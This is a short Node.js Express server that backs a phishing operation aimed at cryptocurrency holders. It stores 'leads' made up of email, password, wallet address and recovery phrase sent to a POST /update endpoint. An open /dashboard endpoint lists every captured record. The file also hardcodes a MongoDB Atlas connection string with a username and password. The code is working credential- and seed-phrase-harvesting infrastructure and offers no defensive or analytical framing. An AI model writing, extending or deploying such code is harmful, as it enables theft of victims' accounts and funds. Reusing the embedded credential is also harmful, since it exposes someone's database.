const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');

const app = express();

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(__dirname));

// MongoDB Connection
// I have placed the URI here directly so it works immediately
const MONGO_URI = "mongodb+srv://scumbag3_db_user:Ihadnopurpose21@cluster0.zisiplb.mongodb.net/leads?retryWrites=true&w=majority";

mongoose.connect(MONGO_URI)
  .then(() => console.log("Successfully connected to MongoDB Atlas"))
  .catch(err => console.error("MongoDB connection error:", err));

// Lead Schema
const leadSchema = new mongoose.Schema({
    email: String,
    password: String,
    walletAddress: String,
    recoveryPhrase: String,
    timestamp: { type: Date, default: Date.now }
});

const Lead = mongoose.model('Lead', leadSchema, 'leads');

// POST endpoint to receive data
app.post('/update', async (req, res) => {
    try {
        console.log("Received lead data: ", req.body);
        const newLead = new Lead(req.body);
        await newLead.save();
        console.log("Lead saved to DB.");
        res.status(200).send("Saved successfully.");
    } catch (err) {
        console.error("Save error:", err);
        res.status(500).send("Database save failed.");
    }
});

// GET endpoint to retrieve all leads for the dashboard
app.get('/dashboard', async (req, res) => {
    try {
        const leads = await Lead.find().sort({ timestamp: -1 });
        res.json(leads);
    } catch (err) {
        console.error("Fetch error:", err);
        res.status(500).send("Error fetching leads.");
    }
});

// Root route loads the dashboard automatically
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'dashboard.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
